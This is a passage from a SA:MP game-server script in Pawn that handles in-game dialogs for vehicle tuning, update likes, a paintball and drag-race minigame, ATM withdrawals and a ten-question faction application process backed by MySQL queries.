						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_SIDESKIRT;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    TogglePlayerControllable( playerid, false );
	                    TuningTDControl( playerid, true );

	                    format( globalstring, sizeof( globalstring ), "%s", cTInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

                        AddVehicleComponent( vehicleid, cTInfo[ cid ][ cID ] );


						SelectTextDraw( playerid, 0xFF000000);
						//|----------cameradeperateral----------|
						InterpolateCameraPos(playerid, 265.382598, -175.946472, 1071.898193, 266.331298, -169.223434, 1070.523071, 3000);
						InterpolateCameraLookAt(playerid, 262.792510, -172.247375, 1069.751586, 262.433868, -172.139846, 1069.380859, 3000);
	                }
		}	
	}
	if(dialogid == DIALOG_UPDATES)
	{
		if(!response) return 1;
		new setat = 0;
		new textafisare[2800];
		for(new a = 0; a < 40; a++)
		{
			if(strlen(updatetext[a][listitem]) > 4)
			{
				if(setat == 0) setat = 1, format(textafisare, sizeof(textafisare), "{FFFFFF}Server Update {0066FF}# %d{FFFFFF}\nVersiune {0066FF}%s\n{FFFFFF}Creat in data %s\n{0066FF}> {FFFFFF}%s\n",listitem+1, updateversiune[listitem],updatedata[listitem],updatetext[a][listitem]);
				else if(setat > 0) format(textafisare, sizeof(textafisare), "%s\n{0066FF}> {FFFFFF}%s\n",textafisare,updatetext[a][listitem]);
			}
		}
		new sqlupdate[1000];
		mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "SELECT * FROM `users` WHERE `LikeUpdate%d`='1'",listitem+1);
		new Cache: aprecieri = mysql_query(SQL, sqlupdate);
		new aprecierii = cache_get_row_count();
		cache_delete(aprecieri);
		idupdate[playerid] = listitem+1;
		format(textafisare, sizeof(textafisare), "%s\n\n\t{0066FF}%d{FFFFFF} players appreciated this update.",textafisare,aprecierii);
		mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `updates` SET `Vizionari`=Vizionari+1 WHERE `ID`='%d'",listitem+1);
		mysql_tquery(SQL, sqlupdate, "", "");
		if(setat > 0) ShowPlayerDialog(playerid, DIALOG_UPDATES+1, DIALOG_STYLE_MSGBOX, "SERVER: UPDATES", textafisare, "Apreciaza","Inchide");
	}
	if(dialogid ==  DIALOG_UPDATES+1)
	{
		if(response)
		{
			new sqlupdate[1000],aapreciat = -1;
			mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "SELECT * FROM `users` WHERE `LikeUpdate%d`='0' AND `id`='%d'",idupdate[playerid],PlayerInfo[playerid][pSQLID]);
			new Cache: aprecieri = mysql_query(SQL, sqlupdate);
			if(cache_get_row_count() > 0) aapreciat = 0;
			cache_delete(aprecieri);
			if(aapreciat == 0)
			{
				mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET `LikeUpdate%d`='1' WHERE `ID`='%d'",idupdate[playerid],PlayerInfo[playerid][pSQLID]);
				mysql_tquery(SQL, sqlupdate, "", "");
				SCM(playerid, COLOR_SERVER, "Liked this update!");
			}
			else return SCM(playerid, COLOR_ERROR, "You already rated this update!");
		}
	}
	if(dialogid == DIALOG_SECURITATE1)
	{
		if(!response) return 1;
		if(response)
		{
			PlayerTextDrawSetString(playerid, SecuritateTD[playerid][5], "......................");
			PlayerTextDrawShow(playerid, SecuritateTD[playerid][5]);
			securitatenr[playerid] = 2;
		}	
	}
	if(dialogid == DIALOG_SECURITATE2)
	{
		if(!response) return 1;
		if(strlen(inputtext) > 4 && strlen(inputtext) < 21)
		{
			if(strcmp(inputtext,PlayerInfo[playerid][pCuvant],true) == 0)
			{
				securitatenr[playerid] = 3;
				PlayerTextDrawSetString(playerid, SecuritateTD[playerid][6], "......................");
				PlayerTextDrawShow(playerid, SecuritateTD[playerid][6]);
			}
			else
			{
				SCM(playerid, COLOR_ERROR, "The key word entered is incorrect!");
			}
		}
		else return SCM(playerid, COLOR_ERROR, "At least 4 characters/maximum of 20 characters.");
	}
	if(dialogid == DIALOG_AIAPLICATIE)
	{
	    if(!response) return 1;
	    new sqlcheck2[256];
		mysql_format(SQL, sqlcheck2, sizeof(sqlcheck2), "DELETE FROM `aplications` WHERE `playerid`='%d'", PlayerInfo[playerid][pSQLID]);
		mysql_tquery(SQL, sqlcheck2, "", "");
		mysql_format(SQL, sqlcheck2, sizeof(sqlcheck2), "UPDATE `users` SET `aplicatie`='0' WHERE `id`='%d'", PlayerInfo[playerid][pSQLID]);
		mysql_tquery(SQL, sqlcheck2, "", "");
		SCM(playerid, COLOR_SERVER, "The application was deleted successfully.");
	}
	if(dialogid == DIALOG_FUNAREA)
	{
		if(response)
		{
			if(listitem == 0)
			{
				new stringg[128],sendernamee[30];
				if(timp_paint > 1) return SendClientMessage(playerid, COLOR_ERROR, "It is already a game in progress.");
				if(paint_incepe > 0 && paint_incepe < 5) return SendClientMessage(playerid, COLOR_ERROR, "It is already a game in progress.");
	            if(paint_jucatori >= 40) return SendClientMessage(playerid, COLOR_ERROR, "Too many players.");
				if(OnDuty[playerid] == 1)
				{
					OnDuty[playerid] = 0;
					SetPlayerArmourEx(playerid, 0);
				}
	            PlayerInfo[playerid][pPaintBallG] = 1;
	            foreach(Player, i)
	            {
	                if(PlayerInfo[i][pPaintBallG] == PlayerInfo[playerid][pPaintBallG])
	                {
	                    GetPlayerName(playerid, sendernamee, sizeof(sendernamee));
	                    format(stringg,sizeof(stringg),"{0066FF}PaintBall: {FFFFFF}%s He entered the paintball arena.", sendernamee);
	                    SendClientMessage(i, -1, stringg);
					}
				}
	            paint_jucatori++;
	            if(paint_jucatori > 0)
	            {
					PlayerTextDrawSetString(playerid, PaintTD[3], "WAITING_TO_PLAYERS...");
					PlayerTextDrawShow(playerid, PaintTD[0]);
					PlayerTextDrawShow(playerid, PaintTD[1]);
					PlayerTextDrawShow(playerid, PaintTD[2]);
					PlayerTextDrawShow(playerid, PaintTD[3]);
				}
	            if(paint_jucatori == 2)
				{
					paint_incepe = 31;
				}
				incamerapaintball[playerid] = 2;
				new tero = 0;
				new ctero = 0;
				foreach(Player, i)
				{
					if(T_SAU_CT[i] == 1) { tero++; }
					if(T_SAU_CT[i] == 2) { ctero++; }
				}
				if(tero > ctero) { T_SAU_CT[playerid] = 2; }
				if(tero < ctero) { T_SAU_CT[playerid] = 1; }
				if(tero == ctero) { T_SAU_CT[playerid] = 2; }
				ResetPlayerWeapons(playerid);
	            SpawnPlayer(playerid);
			}
			if(listitem == 1)
			{
				new nrjucatori = 0;
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(IsPlayerConnected(i) && racingcar[i] >= 0)
					{
						nrjucatori++;
					}
				}
				if(timercursa == -1 && nrjucatori > 1) return SCM(playerid, COLOR_ERROR, "It is already a race in progress!");
				if(pozitiedrag == 0) pozitiedrag++,racingcar[playerid] = CreateVehicle(494,-1129.3380,1095.0505,38.2765,136.7948,211,229,-1); // carpos1
				else if(pozitiedrag == 1) pozitiedrag++,racingcar[playerid] = CreateVehicle(494,-1134.3590,1097.9297,38.3435,136.9767,211,229,-1); // carpos2
				else if(pozitiedrag == 2) pozitiedrag++,racingcar[playerid] = CreateVehicle(494,-1141.1013,1105.5106,38.2981,135.4478,211,229,-1); // carpos3
				else if(pozitiedrag == 3) pozitiedrag=0,racingcar[playerid] = CreateVehicle(494,-1145.2720,1109.7837,38.2887,135.0771,211,229,-1); // carpos4
				PutPlayerInVehicleEx(playerid, racingcar[playerid], 0);
				SetPlayerVirtualWorld(playerid, 123456);
				SetVehicleVirtualWorld(racingcar[playerid], 123456);
				TogglePlayerControllable(playerid, 0);
				SCM(playerid, COLOR_SERVER, "Race start in 20 seconds.");
				DisableRemoteVehicleCollisions(playerid, 1);
				if(timercursa < 1) timercursa = 20;
			}
		}
	}
	if(dialogid == DIALOG_MASINIIMPERFECTE)
	{
		if(!response) return 1;
		if(PlayerInfo[playerid][pPcarkey] != 0)// slot 1
		{
			new rezolvare[1500];
			mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pPcarkey]);
			new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
			if(cache_get_row_count() < 1) PlayerInfo[playerid][pPcarkey] = 0, Update(playerid, pPcarkeyx); 
			cache_delete(rezolvarebugdefinitiv);
		}
		if(PlayerInfo[playerid][pmotokey] != 0)// slot 2
		{
			new rezolvare[1500];
			mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pmotokey]);
			new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
			if(cache_get_row_count() < 1) PlayerInfo[playerid][pmotokey] = 0, Update(playerid, pmotokeyx); 
			cache_delete(rezolvarebugdefinitiv);
		}
		if(PlayerInfo[playerid][pprcarkey] != 0)// slot 3
		{
			new rezolvare[1500];
			mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pprcarkey]);
			new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
			if(cache_get_row_count() < 1) PlayerInfo[playerid][pprcarkey] = 0, Update(playerid, pprcarkeyx); 
			cache_delete(rezolvarebugdefinitiv);
		}
		if(PlayerInfo[playerid][pprcarkey2] != 0)// slot 4
		{
			new rezolvare[1500];
			mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pprcarkey2]);
			new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
			if(cache_get_row_count() < 1) PlayerInfo[playerid][pprcarkey2] = 0, Update(playerid, pprcarkey2x); 
			cache_delete(rezolvarebugdefinitiv);
		}
		if(PlayerInfo[playerid][pPPluscarkey] != 0)// slot 5
		{
			new rezolvare[1500];
			mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pPPluscarkey]);
			new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
			if(cache_get_row_count() < 1) PlayerInfo[playerid][pPPluscarkey] = 0, Update(playerid, pPPluscarkeyx); 
			cache_delete(rezolvarebugdefinitiv);
		}
		if(PlayerInfo[playerid][pPPluscarkey2] != 0) // slot 6
		{
			new rezolvare[1500];
			mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pPPluscarkey2]);
			new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
			if(cache_get_row_count() < 1) PlayerInfo[playerid][pPPluscarkey2] = 0, Update(playerid, pPPluscarkey2x); 
			cache_delete(rezolvarebugdefinitiv);
		}
		if(PlayerInfo[playerid][pCarkey7] != 0) // slot 7
		{
			new rezolvare[1500];
			mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey7]);
			new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
			if(cache_get_row_count() < 1) PlayerInfo[playerid][pCarkey7] = 0, Update(playerid, pCarkey7x); 
			cache_delete(rezolvarebugdefinitiv);
		}
		if(PlayerInfo[playerid][pCarkey8] != 0) // slot 8
		{
			new rezolvare[1500];
			mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey8]);
			new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
			if(cache_get_row_count() < 1) PlayerInfo[playerid][pCarkey8] = 0, Update(playerid, pCarkey8x); 
			cache_delete(rezolvarebugdefinitiv);
		}
		if(PlayerInfo[playerid][pCarkey9] != 0) // slot 9
		{
			new rezolvare[1500];
			mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey9]);
			new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
			if(cache_get_row_count() < 1) PlayerInfo[playerid][pCarkey9] = 0, Update(playerid, pCarkey9x); 
			cache_delete(rezolvarebugdefinitiv);
		}
		if(PlayerInfo[playerid][pCarkey10] != 0) // slot 10
		{
			new rezolvare[1500];
			mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey10]);
			new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
			if(cache_get_row_count() < 1) PlayerInfo[playerid][pCarkey10] = 0, Update(playerid, pCarkey10x); 
			cache_delete(rezolvarebugdefinitiv);
		}
		if(PlayerInfo[playerid][pCarkey11] != 0) // slot 10
		{
			new rezolvare[1500];
			mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey11]);
			new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
			if(cache_get_row_count() < 1) PlayerInfo[playerid][pCarkey11] = 0, Update(playerid, pCarkey11x); 
			cache_delete(rezolvarebugdefinitiv);
		}
		if(PlayerInfo[playerid][pCarkey12] != 0) // slot 10
		{
			new rezolvare[1500];
			mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey12]);
			new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
			if(cache_get_row_count() < 1) PlayerInfo[playerid][pCarkey12] = 0, Update(playerid, pCarkey12x); 
			cache_delete(rezolvarebugdefinitiv);
		}
		if(PlayerInfo[playerid][pCarkey13] != 0) // slot 10
		{
			new rezolvare[1500];
			mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey13]);
			new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
			if(cache_get_row_count() < 1) PlayerInfo[playerid][pCarkey13] = 0, Update(playerid, pCarkey13x); 
			cache_delete(rezolvarebugdefinitiv);
		}
		if(PlayerInfo[playerid][pCarkey14] != 0) // slot 10
		{
			new rezolvare[1500];
			mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey14]);
			new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
			if(cache_get_row_count() < 1) PlayerInfo[playerid][pCarkey14] = 0, Update(playerid, pCarkey14x); 
			cache_delete(rezolvarebugdefinitiv);
		}
		if(PlayerInfo[playerid][pCarkey15] != 0) // slot 10
		{
			new rezolvare[1500];
			mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey15]);
			new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
			if(cache_get_row_count() < 1) PlayerInfo[playerid][pCarkey15] = 0, Update(playerid, pCarkey15x); 
			cache_delete(rezolvarebugdefinitiv);
		}
		SCM(playerid, COLOR_SERVER, "AdmBot: I fixed the problems encountered by this command.");
	}
	if(dialogid == DIALOG_RETRAGERE)
	{
	    if(response)
	    {
	        new suma = strval(inputtext);
	        if(IsNumeric(inputtext))
	        {
	            if(suma > 0 && suma < 5000001)
	            {
	                if(IsValueContainLY(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], suma))
	                {
		                addVV(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], -suma);
		                Update(playerid, pBank);
		                GivePlayerCash(playerid, suma);
						format(string, sizeof(string), "You retired $%s from your bank account.", FormatNumber(suma));
						SCM(playerid, COLOR_GREEN, string);
						format(string, sizeof(string), "Cash out...");
					    PlayerTextDrawSetString(playerid, ATMTD[playerid][10],string);
					    PlayerTextDrawShow(playerid, ATMTD[playerid][10]);
			   		}
			   		else
			   		{
			   		    SCM(playerid, COLOR_ERROR, "You do not have enough money.");
			   		}
	            }
	            else
	            {
	                SCM(playerid, COLOR_ERROR, "Minimum $1, Maximum $5,000,000");
	                ShowPlayerDialog(playerid, DIALOG_RETRAGERE, DIALOG_STYLE_INPUT, "ATM - Cash withdrawal", "Enter the amount you withdraw from your bank account.", "Retrage", "CANCEL");
	            }
	        }
	        else
	        {
	            SCM(playerid, COLOR_ERROR, "Not allowed letters.");
	            ShowPlayerDialog(playerid, DIALOG_RETRAGERE, DIALOG_STYLE_INPUT, "ATM - Cash withdrawal", "Enter the amount you withdraw from your bank account.", "Retrage", "CANCEL");
	        }
	    }
	    else
	    {
	        SCM(playerid, COLOR_ERROR, "You canceled");
	    }
	}
	if(dialogid == DIALOG_APLICATII)
	{
	    if(response)
	    {
	        new idaplicant, checkmysql[1200], level,numeaplicant[60],ore,result[2000],stringmsg[3800];
	        if(listitem >= 0)
	        {
	            idaplicant = Selected[playerid][listitem];
				mysql_format(SQL, checkmysql, sizeof(checkmysql), "SELECT * FROM `users` WHERE `id`='%d'", idaplicant);
				new Cache: verificare = mysql_query(SQL, checkmysql);
				for(new i, c = cache_get_row_count(); i != c; i++)
				{
				    level = cache_get_field_content_int(i, "Level");
				    ore = cache_get_field_content_int(i, "ConnectedTime");
				    cache_get_field_content(i, "name", result); format(numeaplicant,30, result);
				}
				cache_delete(verificare);
				mysql_format(SQL, checkmysql, sizeof(checkmysql), "SELECT * FROM `aplications` WHERE `playerid`='%d'", idaplicant);
				new Cache: verificare2 = mysql_query(SQL, checkmysql);
				for(new i, c = cache_get_row_count(); i != c; i++)
				{
					cache_get_field_content(i, "r1", result); format(raspunsfactiune[playerid], 2000, result);
					cache_get_field_content(i, "r2", result); format(raspunsfactiune2[playerid], 2000, result);
					cache_get_field_content(i, "r3", result); format(raspunsfactiune3[playerid], 2000, result);
					cache_get_field_content(i, "r4", result); format(raspunsfactiune4[playerid], 2000, result);
					cache_get_field_content(i, "r5", result); format(raspunsfactiune5[playerid], 2000, result);
					cache_get_field_content(i, "r6", result); format(raspunsfactiune6[playerid], 2000, result);
					cache_get_field_content(i, "r7", result); format(raspunsfactiune7[playerid], 2000, result);
					cache_get_field_content(i, "r8", result); format(raspunsfactiune8[playerid], 2000, result);
					cache_get_field_content(i, "r9", result); format(raspunsfactiune9[playerid], 2000, result);
					appfactiune[playerid] = cache_get_field_content_int(i, "factionid");
				}
				cache_delete(verificare2);
				format(stringmsg, sizeof(stringmsg), "%s\nName of applicant: %s\nLevel Applicants: %d\nApplicants hours: %d\n\n",stringmsg,numeaplicant,level,ore);
				format(stringmsg, sizeof(stringmsg), "%s\nWhy do you want to go into %s (minimum 10 words): %s\nThe reason of leaving the last factor: %s\nHave you ever been banned ?, if so, what was the reason? (honest answer): %s",stringmsg,DynamicFactions[appfactiune[playerid]][fName],raspunsfactiune[playerid],raspunsfactiune2[playerid],raspunsfactiune3[playerid]);
				format(stringmsg, sizeof(stringmsg), "%s\nHave you ever been part of %s?If so, you leave this faction?: %s\nHow much time do you spend on SA: MP without AFK (hours): %s\nYou agree to stay in %s minimum 14 days?: %s", stringmsg, DynamicFactions[appfactiune[playerid]][fName], raspunsfactiune4[playerid], raspunsfactiune5[playerid],DynamicFactions[appfactiune[playerid]][fName], raspunsfactiune6[playerid]);
				format(stringmsg, sizeof(stringmsg), "%s\nYou had/have problems with someone faction %s?: %s\nYou will meet the leader and members of higher rank %s?: %s\nHow would you describe the reality(minimum 10 words): %s\n\n\n",stringmsg, DynamicFactions[appfactiune[playerid]][fName], raspunsfactiune7[playerid],DynamicFactions[appfactiune[playerid]][fName],raspunsfactiune8[playerid],raspunsfactiune9[playerid]);
				ShowPlayerDialog(playerid, DIALOG_APLICATIE, DIALOG_STYLE_MSGBOX, "Acceptance / rejection of application...",stringmsg, "Accept", "Reject");
                appfactiune[playerid] = idaplicant;
			}
	    }
	}
	if(dialogid == DIALOG_APLICATIE)
	{
	    new checkmysql[1200];
		if(response)
		{
		    if(GetFactionMembers(PlayerInfo[playerid][pLeader]) >= DynamicFactions[PlayerInfo[playerid][pLeader]][fMaxMembers]) return SCM(playerid, COLOR_ERROR, "Nu mai sunt sloturi disponibile...");
		    for(new i; i < MAX_PLAYERS; i++)
		    {
		    	if(PlayerInfo[i][pSQLID] == appfactiune[playerid])
	   			{
					PlayerInfo[i][pMember] = PlayerInfo[playerid][pLeader];
					PlayerInfo[i][pRank] = 1;
					SpawnPlayer(i);
	   			}
		    }
		    mysql_format(SQL, checkmysql, sizeof(checkmysql), "UPDATE `users` SET `Member`='%d', `Rank`='1',`aplicatie`='0' WHERE `id`='%d'", PlayerInfo[playerid][pMember],appfactiune[playerid]);
		    mysql_tquery(SQL, checkmysql, "","");
		    mysql_format(SQL, checkmysql, sizeof(checkmysql), "INSERT INTO emails (`playerid`,`Message`) VALUES ('%d', 'Ai fost acceptat in factiunea %s de catre liderul %s.')",appfactiune[playerid], DynamicFactions[PlayerInfo[playerid][pLeader]][fName],PlayerInfo[playerid][pNormalName]);
		    mysql_tquery(SQL, checkmysql, "","");
		    mysql_format(SQL, checkmysql, sizeof(checkmysql), "DELETE FROM `aplications` WHERE `playerid`='%d'", appfactiune[playerid]);
			mysql_tquery(SQL, checkmysql, "","");
			SCM(playerid, COLOR_ERROR, "The applicant was accepted and was invited faction, its application has been deleted from the database...");
		}
		else
  		{
  		    mysql_format(SQL, checkmysql, sizeof(checkmysql), "UPDATE `users` SET `aplicatie`='0' WHERE `id`='%d'", appfactiune[playerid]);
		    mysql_tquery(SQL, checkmysql, "", "");
	     	mysql_format(SQL, checkmysql, sizeof(checkmysql), "INSERT INTO emails (`playerid`,`Message`) VALUES ('%d', 'Ai fost respins pentru factiunea %s de catre liderul %s.')",appfactiune[playerid], DynamicFactions[PlayerInfo[playerid][pLeader]][fName],PlayerInfo[playerid][pNormalName]);
		    mysql_tquery(SQL, checkmysql, "","");
		    mysql_format(SQL, checkmysql, sizeof(checkmysql), "DELETE FROM `aplications` WHERE `playerid`='%d'", appfactiune[playerid]);
			mysql_tquery(SQL, checkmysql, "","");
			SCM(playerid, COLOR_ERROR, "Aplicantul a fost respins, aplicatia acestuia a fost stearsa din baza de date...");
  		}
	}
	if(dialogid == DIALOG_APLICA)
	{
	    if(response)
	    {
	        new factiune;
	        if(listitem < 6)
		 	{
  	 			factiune = listitem+1;
	        }
	        else
	        {
         		factiune = listitem+2;
	        }
	        if(listitem >= 0)
		 	{
		 	    if(DynamicFactions[factiune][fApplication] < 1) return SCM(playerid, COLOR_ERROR, "Applications for this faction are closed");
				if(GetFactionMembers(factiune) >= DynamicFactions[factiune][fMaxMembers]) return SCM(playerid, COLOR_ERROR, "There are slots available...");
				format(MGLOBAL, sizeof(MGLOBAL), "You need a minimum level %d to apply faction %s!",DynamicFactions[factiune][fMinLevel],DynamicFactions[factiune][fName]);
				if(PlayerInfo[playerid][pLevel] < DynamicFactions[factiune][fMinLevel]) return SCM(playerid, COLOR_ERROR, MGLOBAL);
				format(MGLOBAL, sizeof(MGLOBAL), "You have chosen to apply for faction %s\nAre you ready?", DynamicFactions[factiune][fName]);
				ShowPlayerDialog(playerid, DIALOG_APLICAQ, DIALOG_STYLE_MSGBOX, "Question 1 of 10", MGLOBAL, "Yes","No");
                appfactiune[playerid] = factiune;
			}
	    }
	}
	if(dialogid == DIALOG_APLICAQ)
	{
	    if(response)
	    {
	        format(MGLOBAL, sizeof(MGLOBAL), "(!) Please answer this question more readable and as closely (!)\nWhy do you want to go into %s (minimum 10 words):",DynamicFactions[appfactiune[playerid]][fName]);
	        ShowPlayerDialog(playerid, DIALOG_APLICAQ2, DIALOG_STYLE_INPUT, "Question 2 of 10", MGLOBAL, "Send", "");
	    }
	}
	if(dialogid == DIALOG_APLICAQ2)
	{
	    if(response)
	    {
	        if(strlen(inputtext) >= 10)
	        {
	            format(MGLOBAL, sizeof(MGLOBAL), "(!) Please answer this question more readable and as closely (!)\nThe reason of leaving the last factor:");
	        	ShowPlayerDialog(playerid, DIALOG_APLICAQ3, DIALOG_STYLE_INPUT, "Question 3 of 10", MGLOBAL, "Send", "");
	        	strcpy(raspunsfactiune[playerid],inputtext,512);
	        }
	        else
	        {
	            format(MGLOBAL, sizeof(MGLOBAL), "(!) Please answer this question more readable and as closely (!)\nWhy do you want to go into %s (minimum 10 words):",DynamicFactions[appfactiune[playerid]][fName]);
	        	ShowPlayerDialog(playerid, DIALOG_APLICAQ2, DIALOG_STYLE_INPUT, "Question 2 of 10", MGLOBAL, "Send", "");
	        }
	    }
	}
	if(dialogid == DIALOG_APLICAQ3)
	{
	    if(response)
	    {
	        if(strlen(inputtext) < 1)
			{
				format(MGLOBAL, sizeof(MGLOBAL), "(!) Please answer this question more readable and as closely (!)\nThe reason of leaving the last factor:");
       			ShowPlayerDialog(playerid, DIALOG_APLICAQ3, DIALOG_STYLE_INPUT, "Question 3 of 10", MGLOBAL, "Send", "");
				return 1;
			}
			strcpy(raspunsfactiune2[playerid],inputtext,512);
			format(MGLOBAL, sizeof(MGLOBAL), "(!) Please answer this question more readable and as closely (!)\nHave you ever been banned ?, if so, what was the reason? (honest answer):");
       		ShowPlayerDialog(playerid, DIALOG_APLICAQ4, DIALOG_STYLE_INPUT, "Question 4 of 10", MGLOBAL, "Send", "");
		}
	}
	if(dialogid == DIALOG_APLICAQ4)
	{
	    if(response)
	    {
			if(strlen(inputtext) < 1)
			{
				format(MGLOBAL, sizeof(MGLOBAL), "(!) Please answer this question more readable and as closely (!)\nHave you ever been banned ?, if so, what was the reason? (honest answer):");
       			ShowPlayerDialog(playerid, DIALOG_APLICAQ4, DIALOG_STYLE_INPUT, "Question 4 of 10", MGLOBAL, "Send", "");
				return 1;
			}
			strcpy(raspunsfactiune3[playerid],inputtext,512);
			format(MGLOBAL, sizeof(MGLOBAL), "(!) Please answer this question more readable and as closely (!)\nHave you ever been part of %s?If so, you leave this faction?:",DynamicFactions[appfactiune[playerid]][fName]);
       		ShowPlayerDialog(playerid, DIALOG_APLICAQ5, DIALOG_STYLE_INPUT, "Question 5 of 10", MGLOBAL, "Send", "");
		}
	}
	if(dialogid == DIALOG_APLICAQ5)
	{
	    if(response)
	    {
			if(strlen(inputtext) < 1)
			{
			    format(MGLOBAL, sizeof(MGLOBAL), "(!) Please answer this question more readable and as closely (!)\nHave you ever been part of %s?If so, you leave this faction?:",DynamicFactions[appfactiune[playerid]][fName]);
       			ShowPlayerDialog(playerid, DIALOG_APLICAQ5, DIALOG_STYLE_INPUT, "Question 5 of 10", MGLOBAL, "Send", "");
       			return 1;
			}
			strcpy(raspunsfactiune4[playerid],inputtext,512);
			format(MGLOBAL, sizeof(MGLOBAL), "(!) Please answer this question more readable and as closely (!)\nHow much time do you spend on SA:MP without AFK (hours):");
       		ShowPlayerDialog(playerid, DIALOG_APLICAQ6, DIALOG_STYLE_INPUT, "Question 6 of 10", MGLOBAL, "Send", "");
	    }
	}
	if(dialogid == DIALOG_APLICAQ6)
	{
	    if(response)
	    {
            if(strlen(inputtext) < 1)
			{
			    format(MGLOBAL, sizeof(MGLOBAL), "(!) Please answer this question more readable and as closely (!)\nHow much time do you spend on SA: MP without AFK (hours):");
       			ShowPlayerDialog(playerid, DIALOG_APLICAQ6, DIALOG_STYLE_INPUT, "Question 6 of 10", MGLOBAL, "Send", "");
				return 1;
			}
			strcpy(raspunsfactiune5[playerid],inputtext,512);
			format(MGLOBAL, sizeof(MGLOBAL), "(!) Please answer this question more readable and as closely (!)\nYou agree to stay in %s minimum 14 days?:",DynamicFactions[appfactiune[playerid]][fName]);
			ShowPlayerDialog(playerid, DIALOG_APLICAQ7, DIALOG_STYLE_INPUT, "Question 7 of 10", MGLOBAL, "Send", "");
	    }
	}
	if(dialogid == DIALOG_APLICAQ7)
	{
	    if(response)
	    {
            if(strlen(inputtext) < 1)
			{
			    format(MGLOBAL, sizeof(MGLOBAL), "(!) Please answer this question more readable and as closely (!)\nYou agree to stay in %s minimum 14 days?:",DynamicFactions[appfactiune[playerid]][fName]);
				ShowPlayerDialog(playerid, DIALOG_APLICAQ7, DIALOG_STYLE_INPUT, "Question 7 of 10", MGLOBAL, "Send", "");
				return 1;
			}
			strcpy(raspunsfactiune6[playerid],inputtext,512);
			format(MGLOBAL, sizeof(MGLOBAL), "(!) Please answer this question more readable and as closely (!)\nYou had / have problems with someone faction %s?:",DynamicFactions[appfactiune[playerid]][fName]);
			ShowPlayerDialog(playerid, DIALOG_APLICAQ8, DIALOG_STYLE_INPUT, "Question 8 of 10", MGLOBAL, "Send", "");
	    }
	}
	if(dialogid == DIALOG_APLICAQ8)
	{
	    if(response)
	    {
            if(strlen(inputtext) < 1)
			{
			    format(MGLOBAL, sizeof(MGLOBAL), "(!) Please answer this question more readable and as closely (!)\nYou had / have problems with someone faction %s?:",DynamicFactions[appfactiune[playerid]][fName]);
				ShowPlayerDialog(playerid, DIALOG_APLICAQ8, DIALOG_STYLE_INPUT, "Question 8 of 10", MGLOBAL, "Send", "");
				return 1;
			}
			strcpy(raspunsfactiune7[playerid],inputtext,512);
			format(MGLOBAL, sizeof(MGLOBAL), "(!) Please answer this question more readable and as closely (!)\nYou will meet the leader and members of higher rank %s?:",DynamicFactions[appfactiune[playerid]][fName]);
			ShowPlayerDialog(playerid, DIALOG_APLICAQ9, DIALOG_STYLE_INPUT, "Question 9 of 10", MGLOBAL, "Send", "");
	    }
	}
	if(dialogid == DIALOG_APLICAQ9)
	{
	    if(response)
	    {
            if(strlen(inputtext) < 1)
			{
			    format(MGLOBAL, sizeof(MGLOBAL), "(!) Please answer this question more readable and as closely (!)\nYou will meet the leader and members of higher rank %s?:",DynamicFactions[appfactiune[playerid]][fName]);
